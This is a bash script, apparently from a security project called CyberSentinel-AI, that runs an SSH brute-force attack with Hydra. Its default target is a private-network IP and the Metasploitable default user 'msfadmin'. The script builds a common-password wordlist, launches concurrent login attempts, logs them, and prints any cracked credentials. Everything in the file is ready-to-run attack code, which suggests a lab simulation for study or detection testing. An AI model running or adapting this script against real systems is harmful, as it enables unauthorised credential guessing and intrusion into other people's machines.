#!/bin/bash
# run_attack.sh - SSH Brute Force Attack Simulation
# Part of CyberSentinel-AI

# Banner display
echo "┌───────────────────────────────────────────────┐"
echo "│                                               │"
echo "│ CyberSentinel-AI: Attack Simulation          │"
echo "│ SSH Brute Force Demo                         │"
echo "│                                               │"
echo "└───────────────────────────────────────────────┘"

# Configuration parameters (with defaults)
TARGET=${1:-"192.168.122.167"}        # Default target IP
USERNAME=${2:-"msfadmin"}             # Default username
WORDLIST=${3:-"passwords.txt"}        # Default password list
TASKS=${4:-4}                         # Default concurrent tasks
DELAY=${5:-1}                         # Default delay between attempts
LOG_DIR="logs"                        # Log directory
LOG_FILE="$LOG_DIR/attack.log"        # Attack log file

# Create logs directory
mkdir -p "$LOG_DIR"

# Timestamp for logs
timestamp() {
  date "+%Y-%m-%d %H:%M:%S"
}

# Check if password list exists
if [ ! -f "$WORDLIST" ]; then
  echo "[$(timestamp)] Password list not found: $WORDLIST"
  echo "[$(timestamp)] Creating default password list..."
  
  # Create a default password list
  cat > "$WORDLIST" << EOF
password
123456
admin
root
qwerty
letmein
welcome
monkey
password123
dragon
baseball
football
master
michael
superman
admin123
msfadmin
EOF
  
  echo "[$(timestamp)] Default password list created: $WORDLIST"
fi

# Start attack log
echo "[$(timestamp)] Starting SSH brute force attack" | tee -a "$LOG_FILE"
echo "  - Target: $TARGET" | tee -a "$LOG_FILE"
echo "  - Username: $USERNAME" | tee -a "$LOG_FILE"
echo "  - Password list: $WORDLIST" | tee -a "$LOG_FILE"
echo "  - Concurrent tasks: $TASKS" | tee -a "$LOG_FILE"
echo "  - Delay factor: $DELAY" | tee -a "$LOG_FILE"

# Run Hydra with output redirection
echo "[$(timestamp)] Running Hydra..." | tee -a "$LOG_FILE"
echo "Command: hydra -l $USERNAME -P $WORDLIST ssh://$TARGET -t $TASKS -e nsr -V" | tee -a "$LOG_FILE"

# Execute attack (with timing)
START_TIME=$(date +%s)

# Run Hydra attack with output logging
hydra -l "$USERNAME" -P "$WORDLIST" "ssh://$TARGET" -t "$TASKS" -e nsr -V 2>&1 | tee -a "$LOG_FILE" || {
  echo "[$(timestamp)] Hydra failed with error code $?" | tee -a "$LOG_FILE"
}

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

# Log completion
echo "[$(timestamp)] Attack completed in $DURATION seconds" | tee -a "$LOG_FILE"

# Extract results for easy viewing
SUCCESSFUL=$(grep "host:" "$LOG_FILE" | grep "password:" | wc -l)
ATTEMPTS=$(grep "login attempt" "$LOG_FILE" | wc -l)

# Display summary
echo "┌───────────────────────────────────────────────┐"
echo "│ Attack Summary                                │"
echo "├───────────────────────────────────────────────┤"
echo "│ Duration: $DURATION seconds                   "
echo "│ Total attempts: $ATTEMPTS                     "
echo "│ Successful logins: $SUCCESSFUL                "
echo "└───────────────────────────────────────────────┘"

# Look for successful passwords
if [ "$SUCCESSFUL" -gt 0 ]; then
  echo "Successful login credentials:"
  grep "host:" "$LOG_FILE" | grep "password:" | sed 's/.*login: \([^ ]*\).*password: \([^ ]*\).*/  - Username: \1, Password: \2/'
fi

echo "[$(timestamp)] Attack log saved to $LOG_FILE"
